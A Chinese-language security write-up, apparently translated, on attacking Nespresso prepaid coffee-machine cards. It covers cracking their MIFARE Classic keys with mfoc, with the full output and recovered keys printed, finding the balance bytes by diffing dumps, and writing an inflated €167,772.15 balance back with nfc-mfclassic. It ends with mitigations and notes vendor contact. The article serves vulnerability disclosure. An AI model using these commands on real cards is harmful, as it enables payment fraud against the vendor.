![](https://image.3001.net/images/20210208/1612772531_6020f4b32858b36d56b58.png!small)

## 写在前面的话

在这篇文章中，我将给大家演示如何通过导出并修改Nespresso自定义智能卡来攻击常见的Nespresso咖啡机。

## 关于Nespresso

Nespresso（奈斯派索）是瑞士雀巢公司旗下的一个子品牌，成立于1986年，公司总部位于瑞士，早在1996年，Nespresso的产品就已经畅销世界将近二十个国家和地区了。除此之外，Nespresso（奈斯派索）也是雀巢公司的胶囊式咖啡机及相关产品的品牌。胶囊式咖啡机是近年出现的新型咖啡机，其定位于家用和办公室用。胶囊式咖啡机最大的特点是不能磨豆、不能使用咖啡粉进行冲泡，只能使用专门的咖啡胶囊，也因此使它的推广受到极大的限制。胶囊式咖啡机比之半自动咖啡机和全自动咖啡机操作大大简化，往往只需一个按钮就可以完成操作。另外胶囊机因为其独到的工作方式也省却了全自动咖啡机的磨豆等部件使其体积更轻巧成本更低廉。

## 关于MIFARE Classic智能卡

这一漏洞的关键在于Nespresso用来与机器交互的智能卡的类型。他们的系统依赖于MIFARE
Classic®品牌的智能卡，这些卡片在当时是非常普遍的，而且也是行业标准，甚至于今天我们都能够看到这些智能卡的身影。

![](https://image.3001.net/images/20210208/1612772365_6020f40dcd59d4f8fdfa8.png!small)

然而，2008年的三月份，来自荷兰拉德堡德大学（Radboud University Nijmegen）数字安全研究小组（Digital Security
research group）的安全研究专家们公开发表了一份安全报告，并表明他们已对MIFARE
Classic芯片进行了完整的逆向工程分析，并能够克隆和篡改芯片卡内的数据内容。此报告一经发表，便引起了广大媒体的特别关注，因为这群研究人员在测试的时候使用的是荷兰公共交通OV-Chipkaart卡。

为此，NPX公司曾尝试通过申请初步禁令阻止这项研究成果的发表，但法院却驳回了他们的请求，并指出：“发表科学研究报告在民主社会中有很大的分量，向社会通报芯片中的严重问题也是如此，因为这样可以减轻风险。”

这项研究发布之后，Mifare
Classic系列将不再是安全的了，而且也不应该再被用于安全敏感的工作之中。为此，Mifare提供了Classic系列的替代产品，即Mifare
Plus。Mifare Plus具备已认证的安全级别（基于AES-128），并且与Mifare Classic完全向后兼容。

## 现有工具

### NFC读/写卡器

当然，一个好的读卡器/写卡器需要我们对智能卡进行研究或进行自定义开发。我们推荐使用Advanced Card
Systems公司推出的ACR122U，该设备可靠性强，支持在Windows和Linux系统上工作，而且价格也不贵。

### MIFARE Classic命令行工具：nfc-mfclassic

[ _这款工具_](https://github.com/nfc-tools/libnfc/blob/master/utils/nfc-mfclassic.c)可以在[ _libnfc包_](https://github.com/nfc-tools/libnfc)中找到，并且可以用来读取或写入MIFARE Classic卡数据。

### MIFARE Classic离线破解工具：mfoc

[ _mfoc_](https://github.com/nfc-tools/mfoc)是一个破解MIFARE
Classic芯片加密的程序，它可以将芯片的密钥和解密的内存内容转储到一个文件中。运行该工具时，我们还需要访问NFC读卡器，并且还需要一张带有MIFARE
Classic芯片的智能卡。

虽然这款工具很nice，但该工具好像已经很久没人维护了，因为我在尝试破解Nespresso卡的密钥时，我遇到了一些错误，这些错误会阻止应用程序正确地转储密钥。我修复了这个问题，并且提交了一个pull请求。如果你需要的话，我建议大家下载我【[
_GitHub_](https://github.com/pollev/mfoc)】中的已修复版本。

## 破解密钥并导出智能卡数据

首先，我们需要破解Nespresso卡的非默认密钥。这里我们需要使用[
_mfoc_](https://github.com/pollev/mfoc)工具，并运行下列命令：

    
    
    mfoc -P 500 -O nespresso.dmp

我们在下面的输出中看到，除了最后4个扇区外，卡对大多数扇区都使用了默认密钥。我们需要使用工具并花几分钟时间破解其余的4个密钥，并导出数据。

然后，该工具使用这些密钥创建整个卡的二进制转储。这里需要注意警告信息“Failed reading with Key A after
successfully testing Key A. This is unusual, but continuing anyway in case Key
B succeeds...”。为了解决这个错误，我才发布了一个更新版本的mfoc，否则会导致二进制转储失败。

    
    
    polle@polle-pc:~/data/work/tools/snippets/specific_applications/nespresso$ mfoc -P 500 -O nespresso.dmp
    
    Found Mifare Classic 1k tag
    
    ISO/IEC 14443A (106 kbps) target:
    
        ATQA (SENS_RES): 04  00  
    
    * UID size: single
    
    * bit frame anticollision not supported
    
           UID (NFCID1): 8b  2d  b7  e3  
    
          SAK (SEL_RES): 08  
    
    * Not compliant with ISO/IEC 14443-4
    
    * Not compliant with ISO/IEC 18092
    
     
    
    Fingerprinting based on MIFARE type Identification Procedure:
    
    Other possible matches based on ATQA & SAK values:
    
    * Unknown card, sorry
    
     
    
    Try to authenticate to all sectors with default keys...
    
    Symbols: '.' no key found, '/' A key found, '\' B key found, 'x' both keys found
    
    [Key: ffffffffffff] -> [................]
    
    [Key: a0a1a2a3a4a5] -> [////////////////]
    
    [Key: d3f7d3f7d3f7] -> [////////////////]
    
    [Key: 000000000000] -> [////////////////]
    
    [Key: b0b1b2b3b4b5] -> [xxxxxxxxxxxx////]
    
    [Key: 4d3a99c351dd] -> [xxxxxxxxxxxx////]
    
    [Key: 1a982c7e459a] -> [xxxxxxxxxxxx////]
    
    [Key: aabbccddeeff] -> [xxxxxxxxxxxx////]
    
    [Key: 714c5c886e97] -> [xxxxxxxxxxxx////]
    
    [Key: 587ee5f9350f] -> [xxxxxxxxxxxx////]
    
    [Key: a0478cc39091] -> [xxxxxxxxxxxx////]
    
    [Key: 533cb6c723f6] -> [xxxxxxxxxxxx////]
    
    [Key: 8fd0a4f256e9] -> [xxxxxxxxxxxx////]
    
     
    
    Sector 00 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 01 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 02 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 03 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 04 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 05 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 06 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 07 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 08 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 09 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 10 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 11 - Found   Key A: a0a1a2a3a4a5 Found   Key B: b0b1b2b3b4b5
    
    Sector 12 - Found   Key A: a0a1a2a3a4a5 Unknown Key B
    
    Sector 13 - Found   Key A: a0a1a2a3a4a5 Unknown Key B
    
    Sector 14 - Found   Key A: a0a1a2a3a4a5 Unknown Key B
    
    Sector 15 - Found   Key A: a0a1a2a3a4a5 Unknown Key B
    
     
    
     
    
    Using sector 00 as an exploit sector
    
    Sector: 12, type B, probe 0, distance 2924 .....
    
    Sector: 12, type B, probe 1, distance 2872 .....
    
      Found Key: B [ff9a84635bd3]
    
    Sector: 13, type B, probe 0, distance 2892 .....
    
      Found Key: B [f1a1239a4487]
    
    Sector: 14, type B, probe 0, distance 2932 .....
    
    Sector: 14, type B, probe 1, distance 2868 .....
    
    Sector: 14, type B, probe 2, distance 2894 .....
    
    Sector: 14, type B, probe 3, distance 2880 .....
    
    Sector: 14, type B, probe 4, distance 2844 .....
    
    Sector: 14, type B, probe 5, distance 2892 .....
    
    Sector: 14, type B, probe 6, distance 2876 .....
    
    Sector: 14, type B, probe 7, distance 2892 .....
    
    Sector: 14, type B, probe 8, distance 2920 .....
    
    Sector: 14, type B, probe 9, distance 2884 .....
    
    Sector: 14, type B, probe 10, distance 2944 .....
    
    Sector: 14, type B, probe 11, distance 2896 .....
    
      Found Key: B [6f30126ee7e4]
    
    Sector: 15, type B, probe 0, distance 2852 .....
    
    Sector: 15, type B, probe 1, distance 2924 .....
    
    Sector: 15, type B, probe 2, distance 2898 .....
    
    Sector: 15, type B, probe 3, distance 2836 .....
    
    Sector: 15, type B, probe 4, distance 2880 .....
    
    Sector: 15, type B, probe 5, distance 2884 .....
    
    Sector: 15, type B, probe 6, distance 2856 .....
    
    Sector: 15, type B, probe 7, distance 2788 .....
    
    Sector: 15, type B, probe 8, distance 2868 .....
    
    Sector: 15, type B, probe 9, distance 2802 .....
    
    Sector: 15, type B, probe 10, distance 2868 .....
    
    Sector: 15, type B, probe 11, distance 2906 .....
    
    Sector: 15, type B, probe 12, distance 2894 .....
    
    Sector: 15, type B, probe 13, distance 2832 .....
    
    Sector: 15, type B, probe 14, distance 2832 .....
    
    Sector: 15, type B, probe 15, distance 2828 .....
    
    Sector: 15, type B, probe 16, distance 2842 .....
    
    Sector: 15, type B, probe 17, distance 2836 .....
    
    Sector: 15, type B, probe 18, distance 2834 .....
    
    Sector: 15, type B, probe 19, distance 2810 .....
    
    Sector: 15, type B, probe 20, distance 2914 .....
    
    Sector: 15, type B, probe 21, distance 2874 .....
    
      Found Key: B [6039abb101bb]
    
    Auth with all sectors succeeded, dumping keys to a file!
    
    Block 63, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  4b  44  bb  5a  00  00  00  00  00  00
    
    Block 62, type A, key a0a1a2a3a4a5 :00  00  57  7e  0a  6d  f2  00  00  00  00  00  4d  49  43  00
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 61, type B, key 6039abb101bb :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 60, type B, key 6039abb101bb :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
    
    Block 59, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  0f  00  ff  e3  00  00  00  00  00  00
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 58, type B, key 6f30126ee7e4 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 57, type B, key 6f30126ee7e4 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 56, type B, key 6f30126ee7e4 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
    
    Block 55, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  0f  00  ff  b1  00  00  00  00  00  00
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 54, type B, key f1a1239a4487 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 53, type B, key f1a1239a4487 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 52, type B, key f1a1239a4487 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
    
    Block 51, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  1e  11  ee  5a  00  00  00  00  00  00
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 50, type B, key ff9a84635bd3 :00  00  00  00  00  01  00  00  dd  dd  dd  dd  dd  dd  dd  dd
    
    Failed reading with Key A after successfully testing Key A. This is unusual, but continuing anyway in case Key B succeeds...
    
    Block 49, type B, key ff9a84635bd3 :01  01  ee  ee  ee  ee  ee  ee  00  02  26  01  00  01  00  01
    
    Block 48, type A, key a0a1a2a3a4a5 :08  01  00  84  00  04  4e  1c  00  00  02  00  01  09  26  af
    
    Block 47, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 46, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 45, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 44, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 43, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 42, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 41, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 40, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 39, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 38, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 37, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 36, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 35, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 34, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 33, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 32, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 31, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 30, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 29, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 28, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 27, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 26, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 25, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 24, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 23, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 22, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 21, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 20, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 19, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 18, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 17, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 16, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 15, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 14, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 13, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 12, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 11, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 10, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 09, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 08, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 07, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
    
    Block 06, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 05, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 04, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 03, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  61  e7  89  c1  00  00  00  00  00  00
    
    Block 02, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  09  38  09  38  09  38  09  38
    
    Block 01, type A, key a0a1a2a3a4a5 :d2  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
    
    Block 00, type A, key a0a1a2a3a4a5 :8b  2d  b7  e3  f2  08  04  00  62  63  64  65  66  67  68  69

在继续操作之前，我们需要手动导出这些密钥，并添加至一个名为keys.txt的文件中。这样一来，我们就可以将其添加进我们的工具中，并跳过后续转储的破解部分了。

![](https://image.3001.net/images/20210208/1612772472_6020f47859aea7ac438bd.png!small)

## 二进制比对-查找跟金额有关的字节

我们的操作需要假设金额值保存在智能卡的卡身之上，而不是保存在某个某个集中式服务器上。这是一种更简单、更具成本效益的设计，这样只会需要更少的硬件和软件来实现，这使得任何开发这样一个系统的人都可能选择它，因为他们不知道MIFARE
Classic的安全漏洞。

我给我们的卡充值了1.5欧元，然后使用前面获取到的密钥将卡片的二进制数据导出进行分析：

    
    
    $ mfoc -P 500 -O nespresso_150c.dmp -f keys.txt

接下来，使用卡片在设备上购买咖啡，花掉1欧元，只剩0.5欧，然后再次导出数据：

    
    
    $ mfoc -P 500 -O nespresso_50c.dmp -f keys.txt

现在，我们就可以对两次导出数据进行对比并查看发生变化的地方了：

![](https://image.3001.net/images/20210208/1612772574_6020f4de36a952c6cdd1f.png!small)

我们可以看到，唯一的区别就是第12个扇区中的值正好包含我们在两个转储上预期的值：

    
    
    hex(96) -> int(150) -> €1.50
    
    hex(32) -> int(50) -> €0.50

经过进一步的测试和调试，我们得出结论：该卡使用3个字节来表示卡上的总货币值。因此，其中一张卡的最高金额为167.772,15欧元。

## 写入我们自己的金额值

现在剩下的就是使用十六进制编辑器来更新转储中的货币值。

![](https://image.3001.net/images/20210208/1612772627_6020f51348a965a2e8498.png!small)

拿到导出文件nespresso_FFFFFF.dmp之后（其中包含余额167.772,15欧元），我们尝试将其写回卡中。

了将值写回到卡上，我们必须使用nfc-mfclassic工具。这里需要使用到两份导出文件，一个包含我们要写入卡的转储，另一个包含以前从该特定卡获取的转储。第二次转储仅用于提取密钥。我们的例子中，因为我们正在写回从中获取转储的同一张卡，所以我们可以只使用同一个转储文件两次。

需要注意的是，如果你想把导出数据写到一张空白卡中的话，你还需要使用之前空白卡导出数据中的密钥来确保数据被正确写入。

    
    
    nfc-mfclassic w B nespresso_FFFFFF.dmp nespresso_FFFFFF.dmp

  * w -> 写入每个扇区，除了扇区0之外。
  * B -> 使用'b'密钥执行操作，遇到错误不停止。
  * nespresso_FFFFFF.dmp -> 需要写入卡片中的数据。
  * nespresso_FFFFFF.dmp -> 包含目标卡的密钥。

![](https://image.3001.net/images/20210208/1612772665_6020f5398ce46f5a5fd44.png!small)

注意，如果你写入的是一张空白的MIFARE Classic卡，那么还需要向已被组织的扇区0写入数据。除此之外，你还需要使用空白卡的密钥：

    
    
    nfc-mfclassic W B nespresso_FFFFFF.dmp blank.dmp

![](https://image.3001.net/images/20210208/1612772685_6020f54dbccc30582864c.png!small)

全部搞定！现在我们就可以找一台Nespresso咖啡机来测试一下我们的新卡片了！

![](https://image.3001.net/images/20210208/1612772697_6020f559e50a69457d3c0.png!small)

大家可以看到，我们的新卡片中已经存储了167.772,15欧，不过由于设备上的屏幕太小了，所以设备上只显示了五位数的金额。

## 缓解方案

考虑到这个问题是由Nespresso智能卡所使用的卡片芯片硬件本身问题所导致的，因此我们其实并没有太多的选项来解决或缓解这个问题。不过，我在此也提供下列选项来给用户进行一定的努力或尝试：

> 硬件升级：针对未来的产品使用升级版本的智能卡，并使用更加安全的替代产品。
>
> 软件缓解措施：升级硬件设备，将用户的余额数据存储在后端服务器中，而不是直接写入在卡片身上，而卡片的作用仅限于标识用户个人身份ID。

在跟Nespresso公司取得联系之后，他们似乎现在已经在着手进行这两个方案的实施了，关心系统安全的客户也应该仔细研究这些替代方案。

